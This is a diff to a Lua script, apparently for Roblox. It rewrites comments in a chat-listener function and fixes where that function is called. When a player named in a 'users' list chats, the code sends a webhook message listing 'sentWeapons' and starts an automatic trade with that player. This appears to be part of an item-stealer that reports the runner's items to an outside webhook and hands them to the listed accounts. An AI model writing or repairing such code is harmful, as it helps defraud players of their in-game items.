@@ -514,27 +514,32 @@ local function waitForUserChat()
     local TextChatService = game:GetService("TextChatService")
     local sentMessage = false
     
-    -- Handle the modern TextChatService engine
+    -- Listen for any message sent in the server
     TextChatService.MessageReceived:Connect(function(textChatMessage)
-        -- Check if the message came from a valid text source (a player)
         if textChatMessage.TextSource then
             local senderUserId = textChatMessage.TextSource.UserId
             local senderPlayer = Players:GetPlayerByUserId(senderUserId)
             
-            -- Verify the sender exists and matches your configuration list
+            -- Check if the sender's name is in your configuration table
             if senderPlayer and table.find(users, senderPlayer.Name) then
+                
+                -- Trigger your webhook message only once
                 if not sentMessage then
                     SendMessage(sentWeapons)
                     sentMessage = true
                 end
                 
-                -- Trigger the transaction sequence with the sender
+                -- Isolate the trade function into its own thread so it doesn't freeze the chat
                 task.spawn(function()
                     doTrade(senderPlayer.Name)
                 end)
+                
             end
         end
     end)
+end
+
+-- CRITICAL: You must execute the function out here so the event registers!
 waitForUserChat()
 end
 
